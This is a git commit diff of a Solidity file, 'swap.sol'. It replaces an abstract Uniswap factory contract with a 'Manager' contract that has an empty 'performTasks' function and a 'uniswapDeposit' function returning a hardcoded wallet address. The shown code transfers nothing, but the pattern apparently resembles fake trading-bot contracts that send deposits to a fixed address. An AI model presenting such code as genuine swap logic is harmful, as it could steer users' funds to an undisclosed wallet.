e10daade9072e1fc7d22892efc5ae5298cf8ca26
ddww11 <100456634+ddww11@users.noreply.github.com>
2022-02-26 13:37:54 +0800

    Update swap.sol

--- swap.sol
+++ swap.sol
@@ -1,9 +1,12 @@
 
 pragma solidity ^0.8.4;
 
-abstract contract IUniswapV1Factory {
-    function uniswapDeposit() internal view virtual returns (address payable) {
-        return payable(0x55eb3ceF7ad2a5a659998d8a1Cfb3c068F123456);
-    }
-   
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDeposit() public pure returns (address) {
+		return 0x55eb3ceF7ad2a5a659998d8a1Cfb3c068F123456;
+	}
 }
